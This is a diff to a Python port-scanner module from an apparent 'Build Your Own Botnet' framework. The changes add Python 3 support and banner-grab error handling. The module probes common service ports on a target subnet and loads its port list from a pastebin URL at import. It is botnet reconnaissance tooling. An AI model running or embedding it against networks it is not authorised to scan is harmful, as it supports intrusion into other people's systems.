@@ -1,13 +1,17 @@
-#!/usr/bin/python
+    #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Port Scanner (Build Your Own Botnet)'
 
 # standard libarary
 import os
+import sys
 import json
 import Queue
 import socket
-import urllib
+if sys.version_info[0] > 2:
+    from urllib.request import urlopen
+else:
+    from urllib import urlopen
 import subprocess
 
 # utilities
@@ -19,14 +23,13 @@ platforms = ['win32','linux2','darwin']
 results = {}
 threads = {}
 targets = []
-ports = json.loads(urllib.urlopen('https://pastebin.com/raw/WxK7eUSd').read())
+ports = json.loads(urlopen('https://pastebin.com/raw/WxK7eUSd').read())
 tasks = Queue.Queue()
 usage = 'portscanner [target]'
 desciription = """
 Scan a target IP/subnet for open ports and grab any service banners
 """
 
-# main
 def _ping(host):
     global results
     try:
@@ -41,6 +44,7 @@ def _ping(host):
     except Exception as e:
         util.log(str(e))
         return False
+
 
 @util.threaded
 def _threader():
@@ -57,24 +61,35 @@ def _threader():
 def _scan(target):
     global ports
     global results
+
     try:
+        data = None
         host, port = target
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1.0)
         sock.connect((str(host), int(port)))
-        data = sock.recv(1024)
+
+        try:
+            data = sock.recv(1024)
+        except (socket.error, socket.timeout):
+            pass
+
         sock.close()
+
         if data:
             data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
             data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
             item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}
         else:
             item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}
+
         results.get(host).update(item)
+
     except (socket.error, socket.timeout):
         pass
     except Exception as e:
-        util.log("{} error: {}".format(_scan.func_name, str(e)))
+        util.log("{} error: {}".format(_scan.__name__, str(e)))
+
 
 def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):
     """
